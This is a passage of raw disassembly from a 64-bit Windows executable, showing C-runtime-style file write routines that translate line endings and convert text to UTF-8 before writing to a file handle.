   14000d851:	48 c1 f8 06          	sar    $0x6,%rax
   14000d855:	48 8d 0d 14 19 01 00 	lea    0x11914(%rip),%rcx        # 0x14001f170
   14000d85c:	41 83 e2 3f          	and    $0x3f,%r10d
   14000d860:	49 03 e8             	add    %r8,%rbp
   14000d863:	49 8b f0             	mov    %r8,%rsi
   14000d866:	48 8b 04 c1          	mov    (%rcx,%rax,8),%rax
   14000d86a:	4b 8d 14 d2          	lea    (%r10,%r10,8),%rdx
   14000d86e:	4c 8b 74 d0 28       	mov    0x28(%rax,%rdx,8),%r14
   14000d873:	33 c0                	xor    %eax,%eax
   14000d875:	48 89 07             	mov    %rax,(%rdi)
   14000d878:	89 47 08             	mov    %eax,0x8(%rdi)
   14000d87b:	4c 3b c5             	cmp    %rbp,%r8
   14000d87e:	0f 83 84 00 00 00    	jae    0x14000d908
   14000d884:	48 8d 5c 24 40       	lea    0x40(%rsp),%rbx
   14000d889:	48 3b f5             	cmp    %rbp,%rsi
   14000d88c:	73 2e                	jae    0x14000d8bc
   14000d88e:	0f b7 06             	movzwl (%rsi),%eax
   14000d891:	48 83 c6 02          	add    $0x2,%rsi
   14000d895:	66 83 f8 0a          	cmp    $0xa,%ax
   14000d899:	75 0d                	jne    0x14000d8a8
   14000d89b:	83 47 08 02          	addl   $0x2,0x8(%rdi)
   14000d89f:	66 c7 03 0d 00       	movw   $0xd,(%rbx)
   14000d8a4:	48 83 c3 02          	add    $0x2,%rbx
   14000d8a8:	66 89 03             	mov    %ax,(%rbx)
   14000d8ab:	48 83 c3 02          	add    $0x2,%rbx
   14000d8af:	48 8d 84 24 3e 14 00 	lea    0x143e(%rsp),%rax
   14000d8b6:	00 
   14000d8b7:	48 3b d8             	cmp    %rax,%rbx
   14000d8ba:	72 cd                	jb     0x14000d889
   14000d8bc:	83 64 24 30 00       	andl   $0x0,0x30(%rsp)
   14000d8c1:	48 8d 44 24 40       	lea    0x40(%rsp),%rax
   14000d8c6:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   14000d8cc:	4c 8d 4c 24 30       	lea    0x30(%rsp),%r9
   14000d8d1:	48 2b d8             	sub    %rax,%rbx
   14000d8d4:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   14000d8d9:	48 d1 fb             	sar    $1,%rbx
   14000d8dc:	49 8b ce             	mov    %r14,%rcx
   14000d8df:	03 db                	add    %ebx,%ebx
   14000d8e1:	44 8b c3             	mov    %ebx,%r8d
   14000d8e4:	ff 15 26 28 00 00    	call   *0x2826(%rip)        # 0x140010110
   14000d8ea:	85 c0                	test   %eax,%eax
   14000d8ec:	74 12                	je     0x14000d900
   14000d8ee:	8b 44 24 30          	mov    0x30(%rsp),%eax
   14000d8f2:	01 47 04             	add    %eax,0x4(%rdi)
   14000d8f5:	3b c3                	cmp    %ebx,%eax
   14000d8f7:	72 0f                	jb     0x14000d908
   14000d8f9:	48 3b f5             	cmp    %rbp,%rsi
   14000d8fc:	72 86                	jb     0x14000d884
   14000d8fe:	eb 08                	jmp    0x14000d908
   14000d900:	ff 15 92 27 00 00    	call   *0x2792(%rip)        # 0x140010098
   14000d906:	89 07                	mov    %eax,(%rdi)
   14000d908:	48 8b c7             	mov    %rdi,%rax
   14000d90b:	48 8b 8c 24 40 14 00 	mov    0x1440(%rsp),%rcx
   14000d912:	00 
   14000d913:	48 33 cc             	xor    %rsp,%rcx
   14000d916:	e8 f5 57 ff ff       	call   0x140003110
   14000d91b:	4c 8d 9c 24 50 14 00 	lea    0x1450(%rsp),%r11
   14000d922:	00 
   14000d923:	49 8b 5b 20          	mov    0x20(%r11),%rbx
   14000d927:	49 8b 6b 30          	mov    0x30(%r11),%rbp
   14000d92b:	49 8b e3             	mov    %r11,%rsp
   14000d92e:	41 5e                	pop    %r14
   14000d930:	5f                   	pop    %rdi
   14000d931:	5e                   	pop    %rsi
   14000d932:	c3                   	ret
   14000d933:	cc                   	int3
   14000d934:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000d939:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   14000d93e:	56                   	push   %rsi
   14000d93f:	57                   	push   %rdi
   14000d940:	41 54                	push   %r12
   14000d942:	41 56                	push   %r14
   14000d944:	41 57                	push   %r15
   14000d946:	b8 70 14 00 00       	mov    $0x1470,%eax
   14000d94b:	e8 c0 0f 00 00       	call   0x14000e910
   14000d950:	48 2b e0             	sub    %rax,%rsp
   14000d953:	48 8b 05 a6 06 01 00 	mov    0x106a6(%rip),%rax        # 0x14001e000
   14000d95a:	48 33 c4             	xor    %rsp,%rax
   14000d95d:	48 89 84 24 60 14 00 	mov    %rax,0x1460(%rsp)
   14000d964:	00 
   14000d965:	4c 63 d2             	movslq %edx,%r10
   14000d968:	48 8b d9             	mov    %rcx,%rbx
   14000d96b:	49 8b c2             	mov    %r10,%rax
   14000d96e:	45 8b f1             	mov    %r9d,%r14d
   14000d971:	48 c1 f8 06          	sar    $0x6,%rax
   14000d975:	48 8d 0d f4 17 01 00 	lea    0x117f4(%rip),%rcx        # 0x14001f170
   14000d97c:	41 83 e2 3f          	and    $0x3f,%r10d
   14000d980:	4d 03 f0             	add    %r8,%r14
   14000d983:	4d 8b f8             	mov    %r8,%r15
   14000d986:	49 8b f8             	mov    %r8,%rdi
   14000d989:	48 8b 04 c1          	mov    (%rcx,%rax,8),%rax
   14000d98d:	4b 8d 14 d2          	lea    (%r10,%r10,8),%rdx
   14000d991:	4c 8b 64 d0 28       	mov    0x28(%rax,%rdx,8),%r12
   14000d996:	33 c0                	xor    %eax,%eax
   14000d998:	48 89 03             	mov    %rax,(%rbx)
   14000d99b:	89 43 08             	mov    %eax,0x8(%rbx)
   14000d99e:	4d 3b c6             	cmp    %r14,%r8
   14000d9a1:	0f 83 d2 00 00 00    	jae    0x14000da79
   14000d9a7:	4c 8d 4c 24 50       	lea    0x50(%rsp),%r9
   14000d9ac:	49 3b fe             	cmp    %r14,%rdi
   14000d9af:	73 2c                	jae    0x14000d9dd
   14000d9b1:	0f b7 07             	movzwl (%rdi),%eax
   14000d9b4:	48 83 c7 02          	add    $0x2,%rdi
   14000d9b8:	66 83 f8 0a          	cmp    $0xa,%ax
   14000d9bc:	75 0a                	jne    0x14000d9c8
   14000d9be:	66 41 c7 01 0d 00    	movw   $0xd,(%r9)
   14000d9c4:	49 83 c1 02          	add    $0x2,%r9
   14000d9c8:	66 41 89 01          	mov    %ax,(%r9)
   14000d9cc:	49 83 c1 02          	add    $0x2,%r9
   14000d9d0:	48 8d 84 24 f8 06 00 	lea    0x6f8(%rsp),%rax
   14000d9d7:	00 
   14000d9d8:	4c 3b c8             	cmp    %rax,%r9
   14000d9db:	72 cf                	jb     0x14000d9ac
   14000d9dd:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   14000d9e3:	48 8d 44 24 50       	lea    0x50(%rsp),%rax
   14000d9e8:	48 83 64 24 30 00    	andq   $0x0,0x30(%rsp)
   14000d9ee:	4c 8d 44 24 50       	lea    0x50(%rsp),%r8
   14000d9f3:	4c 2b c8             	sub    %rax,%r9
   14000d9f6:	c7 44 24 28 55 0d 00 	movl   $0xd55,0x28(%rsp)
   14000d9fd:	00 
   14000d9fe:	48 8d 84 24 00 07 00 	lea    0x700(%rsp),%rax
   14000da05:	00 
   14000da06:	49 d1 f9             	sar    $1,%r9
   14000da09:	33 d2                	xor    %edx,%edx
   14000da0b:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000da10:	b9 e9 fd 00 00       	mov    $0xfde9,%ecx
   14000da15:	e8 3e c0 ff ff       	call   0x140009a58
   14000da1a:	8b e8                	mov    %eax,%ebp
   14000da1c:	85 c0                	test   %eax,%eax
   14000da1e:	74 51                	je     0x14000da71
   14000da20:	33 f6                	xor    %esi,%esi
   14000da22:	85 c0                	test   %eax,%eax
   14000da24:	74 38                	je     0x14000da5e
   14000da26:	83 64 24 40 00       	andl   $0x0,0x40(%rsp)
   14000da2b:	48 8d 94 24 00 07 00 	lea    0x700(%rsp),%rdx
   14000da32:	00 
   14000da33:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   14000da39:	4c 8d 4c 24 40       	lea    0x40(%rsp),%r9
   14000da3e:	8b ce                	mov    %esi,%ecx
   14000da40:	44 8b c5             	mov    %ebp,%r8d
   14000da43:	48 03 d1             	add    %rcx,%rdx
   14000da46:	44 2b c6             	sub    %esi,%r8d
   14000da49:	49 8b cc             	mov    %r12,%rcx
   14000da4c:	ff 15 be 26 00 00    	call   *0x26be(%rip)        # 0x140010110
   14000da52:	85 c0                	test   %eax,%eax
   14000da54:	74 1b                	je     0x14000da71
   14000da56:	03 74 24 40          	add    0x40(%rsp),%esi
   14000da5a:	3b f5                	cmp    %ebp,%esi
   14000da5c:	72 c8                	jb     0x14000da26
   14000da5e:	8b c7                	mov    %edi,%eax
   14000da60:	41 2b c7             	sub    %r15d,%eax
   14000da63:	89 43 04             	mov    %eax,0x4(%rbx)
   14000da66:	49 3b fe             	cmp    %r14,%rdi
   14000da69:	0f 82 38 ff ff ff    	jb     0x14000d9a7
   14000da6f:	eb 08                	jmp    0x14000da79
   14000da71:	ff 15 21 26 00 00    	call   *0x2621(%rip)        # 0x140010098
   14000da77:	89 03                	mov    %eax,(%rbx)
   14000da79:	48 8b c3             	mov    %rbx,%rax
   14000da7c:	48 8b 8c 24 60 14 00 	mov    0x1460(%rsp),%rcx
   14000da83:	00 
   14000da84:	48 33 cc             	xor    %rsp,%rcx
   14000da87:	e8 84 56 ff ff       	call   0x140003110
   14000da8c:	4c 8d 9c 24 70 14 00 	lea    0x1470(%rsp),%r11
   14000da93:	00 
   14000da94:	49 8b 5b 30          	mov    0x30(%r11),%rbx
   14000da98:	49 8b 6b 40          	mov    0x40(%r11),%rbp
   14000da9c:	49 8b e3             	mov    %r11,%rsp
   14000da9f:	41 5f                	pop    %r15
   14000daa1:	41 5e                	pop    %r14
   14000daa3:	41 5c                	pop    %r12
   14000daa5:	5f                   	pop    %rdi
   14000daa6:	5e                   	pop    %rsi
   14000daa7:	c3                   	ret
   14000daa8:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   14000daad:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   14000dab2:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   14000dab6:	56                   	push   %rsi
   14000dab7:	41 54                	push   %r12
   14000dab9:	41 55                	push   %r13
   14000dabb:	41 56                	push   %r14
   14000dabd:	41 57                	push   %r15
   14000dabf:	48 83 ec 30          	sub    $0x30,%rsp
   14000dac3:	49 8b d9             	mov    %r9,%rbx
   14000dac6:	45 8b e8             	mov    %r8d,%r13d
   14000dac9:	48 63 f1             	movslq %ecx,%rsi
   14000dacc:	83 fe fe             	cmp    $0xfffffffe,%esi
   14000dacf:	75 2d                	jne    0x14000dafe
   14000dad1:	41 c6 41 38 01       	movb   $0x1,0x38(%r9)
   14000dad6:	41 83 61 34 00       	andl   $0x0,0x34(%r9)
   14000dadb:	41 c6 41 30 01       	movb   $0x1,0x30(%r9)
   14000dae0:	41 c7 41 2c 09 00 00 	movl   $0x9,0x2c(%r9)
   14000dae7:	00 
   14000dae8:	83 c8 ff             	or     $0xffffffff,%eax
   14000daeb:	48 8b 5c 24 70       	mov    0x70(%rsp),%rbx
   14000daf0:	48 83 c4 30          	add    $0x30,%rsp
   14000daf4:	41 5f                	pop    %r15
   14000daf6:	41 5e                	pop    %r14
   14000daf8:	41 5d                	pop    %r13
   14000dafa:	41 5c                	pop    %r12
   14000dafc:	5e                   	pop    %rsi
   14000dafd:	c3                   	ret
   14000dafe:	85 c9                	test   %ecx,%ecx
   14000db00:	78 0f                	js     0x14000db11
   14000db02:	3b 35 68 1a 01 00    	cmp    0x11a68(%rip),%esi        # 0x14001f570
   14000db08:	73 07                	jae    0x14000db11
   14000db0a:	b8 01 00 00 00       	mov    $0x1,%eax
   14000db0f:	eb 02                	jmp    0x14000db13
   14000db11:	33 c0                	xor    %eax,%eax
   14000db13:	85 c0                	test   %eax,%eax
   14000db15:	75 33                	jne    0x14000db4a
   14000db17:	41 c6 41 38 01       	movb   $0x1,0x38(%r9)
   14000db1c:	41 83 61 34 00       	andl   $0x0,0x34(%r9)
   14000db21:	41 c6 41 30 01       	movb   $0x1,0x30(%r9)
   14000db26:	41 c7 41 2c 09 00 00 	movl   $0x9,0x2c(%r9)
   14000db2d:	00 
   14000db2e:	48 89 5c 24 28       	mov    %rbx,0x28(%rsp)
   14000db33:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   14000db39:	45 33 c9             	xor    %r9d,%r9d
   14000db3c:	45 33 c0             	xor    %r8d,%r8d
   14000db3f:	33 d2                	xor    %edx,%edx
   14000db41:	33 c9                	xor    %ecx,%ecx
   14000db43:	e8 c4 a1 ff ff       	call   0x140007d0c
   14000db48:	eb 9e                	jmp    0x14000dae8
   14000db4a:	48 8b c6             	mov    %rsi,%rax
   14000db4d:	4c 8b fe             	mov    %rsi,%r15
   14000db50:	49 c1 ff 06          	sar    $0x6,%r15
   14000db54:	48 8d 0d 15 16 01 00 	lea    0x11615(%rip),%rcx        # 0x14001f170
   14000db5b:	83 e0 3f             	and    $0x3f,%eax
   14000db5e:	4c 8d 24 c0          	lea    (%rax,%rax,8),%r12
   14000db62:	4a 8b 04 f9          	mov    (%rcx,%r15,8),%rax
   14000db66:	42 f6 44 e0 38 01    	testb  $0x1,0x38(%rax,%r12,8)
   14000db6c:	74 a9                	je     0x14000db17
   14000db6e:	8b ce                	mov    %esi,%ecx
   14000db70:	e8 8f c3 ff ff       	call   0x140009f04
   14000db75:	41 83 ce ff          	or     $0xffffffff,%r14d
   14000db79:	48 8d 05 f0 15 01 00 	lea    0x115f0(%rip),%rax        # 0x14001f170
   14000db80:	4a 8b 04 f8          	mov    (%rax,%r15,8),%rax
   14000db84:	42 f6 44 e0 38 01    	testb  $0x1,0x38(%rax,%r12,8)
   14000db8a:	75 15                	jne    0x14000dba1
   14000db8c:	c6 43 30 01          	movb   $0x1,0x30(%rbx)
   14000db90:	c7 43 2c 09 00 00 00 	movl   $0x9,0x2c(%rbx)
   14000db97:	c6 43 38 01          	movb   $0x1,0x38(%rbx)
   14000db9b:	83 63 34 00          	andl   $0x0,0x34(%rbx)
   14000db9f:	eb 15                	jmp    0x14000dbb6
   14000dba1:	4c 8b cb             	mov    %rbx,%r9
   14000dba4:	45 8b c5             	mov    %r13d,%r8d
   14000dba7:	48 8b 54 24 68       	mov    0x68(%rsp),%rdx
   14000dbac:	8b ce                	mov    %esi,%ecx
   14000dbae:	e8 15 00 00 00       	call   0x14000dbc8
   14000dbb3:	44 8b f0             	mov    %eax,%r14d
   14000dbb6:	8b ce                	mov    %esi,%ecx
   14000dbb8:	e8 6f c3 ff ff       	call   0x140009f2c
   14000dbbd:	41 8b c6             	mov    %r14d,%eax
   14000dbc0:	e9 26 ff ff ff       	jmp    0x14000daeb
   14000dbc5:	cc                   	int3
   14000dbc6:	cc                   	int3
   14000dbc7:	cc                   	int3
   14000dbc8:	40 55                	rex push %rbp
   14000dbca:	53                   	push   %rbx
   14000dbcb:	56                   	push   %rsi
   14000dbcc:	57                   	push   %rdi
   14000dbcd:	41 54                	push   %r12
   14000dbcf:	41 55                	push   %r13
   14000dbd1:	41 56                	push   %r14
   14000dbd3:	41 57                	push   %r15
   14000dbd5:	48 8b ec             	mov    %rsp,%rbp
   14000dbd8:	48 83 ec 68          	sub    $0x68,%rsp
   14000dbdc:	33 ff                	xor    %edi,%edi
   14000dbde:	45 8b f0             	mov    %r8d,%r14d
   14000dbe1:	4c 63 e9             	movslq %ecx,%r13
   14000dbe4:	49 8b d9             	mov    %r9,%rbx
   14000dbe7:	48 8b f2             	mov    %rdx,%rsi
   14000dbea:	45 85 c0             	test   %r8d,%r8d
   14000dbed:	0f 84 f1 02 00 00    	je     0x14000dee4
   14000dbf3:	48 85 d2             	test   %rdx,%rdx
   14000dbf6:	75 37                	jne    0x14000dc2f
   14000dbf8:	41 c6 41 38 01       	movb   $0x1,0x38(%r9)
   14000dbfd:	45 33 c0             	xor    %r8d,%r8d
   14000dc00:	41 89 79 34          	mov    %edi,0x34(%r9)
   14000dc04:	33 d2                	xor    %edx,%edx
   14000dc06:	41 c6 41 30 01       	movb   $0x1,0x30(%r9)
   14000dc0b:	33 c9                	xor    %ecx,%ecx
   14000dc0d:	41 c7 41 2c 16 00 00 	movl   $0x16,0x2c(%r9)
   14000dc14:	00 
   14000dc15:	45 33 c9             	xor    %r9d,%r9d
   14000dc18:	48 89 5c 24 28       	mov    %rbx,0x28(%rsp)
   14000dc1d:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   14000dc22:	e8 e5 a0 ff ff       	call   0x140007d0c
   14000dc27:	83 c8 ff             	or     $0xffffffff,%eax
   14000dc2a:	e9 b7 02 00 00       	jmp    0x14000dee6
   14000dc2f:	49 8b c5             	mov    %r13,%rax
   14000dc32:	48 8d 0d 37 15 01 00 	lea    0x11537(%rip),%rcx        # 0x14001f170
   14000dc39:	83 e0 3f             	and    $0x3f,%eax
   14000dc3c:	4d 8b e5             	mov    %r13,%r12
   14000dc3f:	49 c1 fc 06          	sar    $0x6,%r12
   14000dc43:	4c 8d 3c c0          	lea    (%rax,%rax,8),%r15
   14000dc47:	4a 8b 0c e1          	mov    (%rcx,%r12,8),%rcx
   14000dc4b:	42 8a 44 f9 39       	mov    0x39(%rcx,%r15,8),%al
   14000dc50:	88 45 c8             	mov    %al,-0x38(%rbp)
   14000dc53:	fe c8                	dec    %al
   14000dc55:	3c 01                	cmp    $0x1,%al
   14000dc57:	77 09                	ja     0x14000dc62
   14000dc59:	41 8b c6             	mov    %r14d,%eax
   14000dc5c:	f7 d0                	not    %eax
   14000dc5e:	a8 01                	test   $0x1,%al
   14000dc60:	74 96                	je     0x14000dbf8
   14000dc62:	42 f6 44 f9 38 20    	testb  $0x20,0x38(%rcx,%r15,8)
   14000dc68:	74 0e                	je     0x14000dc78
   14000dc6a:	33 d2                	xor    %edx,%edx
   14000dc6c:	41 8b cd             	mov    %r13d,%ecx
   14000dc6f:	44 8d 42 02          	lea    0x2(%rdx),%r8d
   14000dc73:	e8 e0 04 00 00       	call   0x14000e158
   14000dc78:	41 8b cd             	mov    %r13d,%ecx
   14000dc7b:	48 89 7d e0          	mov    %rdi,-0x20(%rbp)
   14000dc7f:	e8 6c 03 00 00       	call   0x14000dff0
   14000dc84:	33 c9                	xor    %ecx,%ecx
   14000dc86:	4c 8d 05 e3 14 01 00 	lea    0x114e3(%rip),%r8        # 0x14001f170
   14000dc8d:	85 c0                	test   %eax,%eax
   14000dc8f:	0f 84 1b 01 00 00    	je     0x14000ddb0
   14000dc95:	4b 8b 04 e0          	mov    (%r8,%r12,8),%rax
   14000dc99:	42 38 4c f8 38       	cmp    %cl,0x38(%rax,%r15,8)
   14000dc9e:	0f 8d 0c 01 00 00    	jge    0x14000ddb0
   14000dca4:	38 4b 28             	cmp    %cl,0x28(%rbx)
   14000dca7:	75 11                	jne    0x14000dcba
   14000dca9:	48 8b cb             	mov    %rbx,%rcx
   14000dcac:	e8 1f 97 ff ff       	call   0x1400073d0
   14000dcb1:	33 c9                	xor    %ecx,%ecx
   14000dcb3:	4c 8d 05 b6 14 01 00 	lea    0x114b6(%rip),%r8        # 0x14001f170
   14000dcba:	48 8b 43 18          	mov    0x18(%rbx),%rax
   14000dcbe:	48 39 88 38 01 00 00 	cmp    %rcx,0x138(%rax)
   14000dcc5:	75 0f                	jne    0x14000dcd6
   14000dcc7:	4b 8b 04 e0          	mov    (%r8,%r12,8),%rax
   14000dccb:	42 38 4c f8 39       	cmp    %cl,0x39(%rax,%r15,8)
   14000dcd0:	0f 84 da 00 00 00    	je     0x14000ddb0
   14000dcd6:	89 4d f0             	mov    %ecx,-0x10(%rbp)
   14000dcd9:	48 8d 55 f0          	lea    -0x10(%rbp),%rdx
   14000dcdd:	4b 8b 0c e0          	mov    (%r8,%r12,8),%rcx
   14000dce1:	4a 8b 4c f9 28       	mov    0x28(%rcx,%r15,8),%rcx
   14000dce6:	ff 15 44 23 00 00    	call   *0x2344(%rip)        # 0x140010030
   14000dcec:	85 c0                	test   %eax,%eax
   14000dcee:	0f 84 b5 00 00 00    	je     0x14000dda9
   14000dcf4:	0f be 4d c8          	movsbl -0x38(%rbp),%ecx
   14000dcf8:	85 c9                	test   %ecx,%ecx
   14000dcfa:	0f 84 86 00 00 00    	je     0x14000dd86
   14000dd00:	83 e9 01             	sub    $0x1,%ecx
   14000dd03:	74 09                	je     0x14000dd0e
   14000dd05:	83 f9 01             	cmp    $0x1,%ecx
   14000dd08:	0f 85 50 01 00 00    	jne    0x14000de5e
   14000dd0e:	4e 8d 24 36          	lea    (%rsi,%r14,1),%r12
   14000dd12:	48 89 7d d0          	mov    %rdi,-0x30(%rbp)
   14000dd16:	4c 8b fe             	mov    %rsi,%r15
   14000dd19:	49 3b f4             	cmp    %r12,%rsi
   14000dd1c:	0f 83 32 01 00 00    	jae    0x14000de54
   14000dd22:	44 8b 75 d4          	mov    -0x2c(%rbp),%r14d
   14000dd26:	41 0f b7 07          	movzwl (%r15),%eax
   14000dd2a:	0f b7 c8             	movzwl %ax,%ecx
   14000dd2d:	66 89 45 c8          	mov    %ax,-0x38(%rbp)
   14000dd31:	e8 2a 04 00 00       	call   0x14000e160
   14000dd36:	0f b7 4d c8          	movzwl -0x38(%rbp),%ecx
   14000dd3a:	66 3b c1             	cmp    %cx,%ax
   14000dd3d:	75 39                	jne    0x14000dd78
   14000dd3f:	41 83 c6 02          	add    $0x2,%r14d
   14000dd43:	44 89 75 d4          	mov    %r14d,-0x2c(%rbp)
   14000dd47:	66 83 f9 0a          	cmp    $0xa,%cx
   14000dd4b:	75 1d                	jne    0x14000dd6a
   14000dd4d:	b9 0d 00 00 00       	mov    $0xd,%ecx
   14000dd52:	e8 09 04 00 00       	call   0x14000e160
   14000dd57:	b9 0d 00 00 00       	mov    $0xd,%ecx
   14000dd5c:	66 3b c1             	cmp    %cx,%ax
   14000dd5f:	75 17                	jne    0x14000dd78
   14000dd61:	41 ff c6             	inc    %r14d
   14000dd64:	44 89 75 d4          	mov    %r14d,-0x2c(%rbp)
   14000dd68:	ff c7                	inc    %edi
   14000dd6a:	49 83 c7 02          	add    $0x2,%r15
   14000dd6e:	4d 3b fc             	cmp    %r12,%r15
   14000dd71:	72 b3                	jb     0x14000dd26
   14000dd73:	e9 dc 00 00 00       	jmp    0x14000de54
   14000dd78:	ff 15 1a 23 00 00    	call   *0x231a(%rip)        # 0x140010098
   14000dd7e:	89 45 d0             	mov    %eax,-0x30(%rbp)
   14000dd81:	e9 ce 00 00 00       	jmp    0x14000de54
   14000dd86:	45 8b ce             	mov    %r14d,%r9d
   14000dd89:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   14000dd8e:	4c 8b c6             	mov    %rsi,%r8
   14000dd91:	48 8d 4d d0          	lea    -0x30(%rbp),%rcx
   14000dd95:	41 8b d5             	mov    %r13d,%edx
   14000dd98:	e8 df f4 ff ff       	call   0x14000d27c
   14000dd9d:	f2 0f 10 00          	movsd  (%rax),%xmm0
   14000dda1:	8b 78 08             	mov    0x8(%rax),%edi
   14000dda4:	e9 b0 00 00 00       	jmp    0x14000de59
   14000dda9:	4c 8d 05 c0 13 01 00 	lea    0x113c0(%rip),%r8        # 0x14001f170
   14000ddb0:	49 8b cd             	mov    %r13,%rcx
   14000ddb3:	49 8b c5             	mov    %r13,%rax
   14000ddb6:	48 c1 f8 06          	sar    $0x6,%rax
   14000ddba:	83 e1 3f             	and    $0x3f,%ecx
   14000ddbd:	49 8b 14 c0          	mov    (%r8,%rax,8),%rdx
   14000ddc1:	48 8d 0c c9          	lea    (%rcx,%rcx,8),%rcx
   14000ddc5:	40 38 7c ca 38       	cmp    %dil,0x38(%rdx,%rcx,8)
   14000ddca:	7d 55                	jge    0x14000de21
   14000ddcc:	0f be 4d c8          	movsbl -0x38(%rbp),%ecx
   14000ddd0:	85 c9                	test   %ecx,%ecx
   14000ddd2:	74 36                	je     0x14000de0a
   14000ddd4:	83 e9 01             	sub    $0x1,%ecx
   14000ddd7:	74 1d                	je     0x14000ddf6
   14000ddd9:	83 f9 01             	cmp    $0x1,%ecx
   14000dddc:	0f 85 83 00 00 00    	jne    0x14000de65
   14000dde2:	45 8b ce             	mov    %r14d,%r9d
   14000dde5:	48 8d 4d d0          	lea    -0x30(%rbp),%rcx
   14000dde9:	4c 8b c6             	mov    %rsi,%r8
   14000ddec:	41 8b d5             	mov    %r13d,%edx
   14000ddef:	e8 24 fa ff ff       	call   0x14000d818
   14000ddf4:	eb a7                	jmp    0x14000dd9d
   14000ddf6:	45 8b ce             	mov    %r14d,%r9d
   14000ddf9:	48 8d 4d d0          	lea    -0x30(%rbp),%rcx
   14000ddfd:	4c 8b c6             	mov    %rsi,%r8
   14000de00:	41 8b d5             	mov    %r13d,%edx
   14000de03:	e8 2c fb ff ff       	call   0x14000d934
   14000de08:	eb 93                	jmp    0x14000dd9d
   14000de0a:	45 8b ce             	mov    %r14d,%r9d
   14000de0d:	48 8d 4d d0          	lea    -0x30(%rbp),%rcx
   14000de11:	4c 8b c6             	mov    %rsi,%r8
   14000de14:	41 8b d5             	mov    %r13d,%edx
   14000de17:	e8 f4 f8 ff ff       	call   0x14000d710
   14000de1c:	e9 7c ff ff ff       	jmp    0x14000dd9d
   14000de21:	48 8b 4c ca 28       	mov    0x28(%rdx,%rcx,8),%rcx
   14000de26:	4c 8d 4d d4          	lea    -0x2c(%rbp),%r9
   14000de2a:	33 c0                	xor    %eax,%eax
   14000de2c:	48 8b d6             	mov    %rsi,%rdx
   14000de2f:	48 21 44 24 20       	and    %rax,0x20(%rsp)
   14000de34:	45 8b c6             	mov    %r14d,%r8d
   14000de37:	48 89 45 d0          	mov    %rax,-0x30(%rbp)
   14000de3b:	89 45 d8             	mov    %eax,-0x28(%rbp)
   14000de3e:	ff 15 cc 22 00 00    	call   *0x22cc(%rip)        # 0x140010110
   14000de44:	85 c0                	test   %eax,%eax
   14000de46:	75 09                	jne    0x14000de51
   14000de48:	ff 15 4a 22 00 00    	call   *0x224a(%rip)        # 0x140010098
   14000de4e:	89 45 d0             	mov    %eax,-0x30(%rbp)
   14000de51:	8b 7d d8             	mov    -0x28(%rbp),%edi
   14000de54:	f2 0f 10 45 d0       	movsd  -0x30(%rbp),%xmm0
   14000de59:	f2 0f 11 45 e0       	movsd  %xmm0,-0x20(%rbp)
   14000de5e:	4c 8d 05 0b 13 01 00 	lea    0x1130b(%rip),%r8        # 0x14001f170
   14000de65:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
   14000de69:	48 c1 e8 20          	shr    $0x20,%rax
   14000de6d:	85 c0                	test   %eax,%eax
   14000de6f:	75 6c                	jne    0x14000dedd
   14000de71:	8b 45 e0             	mov    -0x20(%rbp),%eax
   14000de74:	85 c0                	test   %eax,%eax
   14000de76:	74 2c                	je     0x14000dea4
   14000de78:	83 f8 05             	cmp    $0x5,%eax
   14000de7b:	75 17                	jne    0x14000de94
   14000de7d:	c6 43 30 01          	movb   $0x1,0x30(%rbx)
   14000de81:	c7 43 2c 09 00 00 00 	movl   $0x9,0x2c(%rbx)
   14000de88:	c6 43 38 01          	movb   $0x1,0x38(%rbx)
   14000de8c:	89 43 34             	mov    %eax,0x34(%rbx)
   14000de8f:	e9 93 fd ff ff       	jmp    0x14000dc27
   14000de94:	8b 4d e0             	mov    -0x20(%rbp),%ecx
   14000de97:	48 8b d3             	mov    %rbx,%rdx
   14000de9a:	e8 85 a0 ff ff       	call   0x140007f24
   14000de9f:	e9 83 fd ff ff       	jmp    0x14000dc27
   14000dea4:	49 8b cd             	mov    %r13,%rcx
   14000dea7:	49 8b c5             	mov    %r13,%rax
   14000deaa:	48 c1 f8 06          	sar    $0x6,%rax
   14000deae:	83 e1 3f             	and    $0x3f,%ecx
   14000deb1:	49 8b 04 c0          	mov    (%r8,%rax,8),%rax
   14000deb5:	48 8d 0c c9          	lea    (%rcx,%rcx,8),%rcx
   14000deb9:	f6 44 c8 38 40       	testb  $0x40,0x38(%rax,%rcx,8)
   14000debe:	74 05                	je     0x14000dec5
   14000dec0:	80 3e 1a             	cmpb   $0x1a,(%rsi)
   14000dec3:	74 1f                	je     0x14000dee4
   14000dec5:	83 63 34 00          	andl   $0x0,0x34(%rbx)
   14000dec9:	c6 43 30 01          	movb   $0x1,0x30(%rbx)
   14000decd:	c7 43 2c 1c 00 00 00 	movl   $0x1c,0x2c(%rbx)
   14000ded4:	c6 43 38 01          	movb   $0x1,0x38(%rbx)
   14000ded8:	e9 4a fd ff ff       	jmp    0x14000dc27
   14000dedd:	8b 45 e4             	mov    -0x1c(%rbp),%eax
   14000dee0:	2b c7                	sub    %edi,%eax
   14000dee2:	eb 02                	jmp    0x14000dee6
   14000dee4:	33 c0                	xor    %eax,%eax
   14000dee6:	48 83 c4 68          	add    $0x68,%rsp
   14000deea:	41 5f                	pop    %r15
   14000deec:	41 5e                	pop    %r14
   14000deee:	41 5d                	pop    %r13
   14000def0:	41 5c                	pop    %r12
   14000def2:	5f                   	pop    %rdi
   14000def3:	5e                   	pop    %rsi
   14000def4:	5b                   	pop    %rbx
   14000def5:	5d                   	pop    %rbp
   14000def6:	c3                   	ret
   14000def7:	cc                   	int3
   14000def8:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   14000defd:	57                   	push   %rdi
   14000defe:	48 83 ec 30          	sub    $0x30,%rsp
   14000df02:	83 64 24 20 00       	andl   $0x0,0x20(%rsp)
   14000df07:	b9 08 00 00 00       	mov    $0x8,%ecx
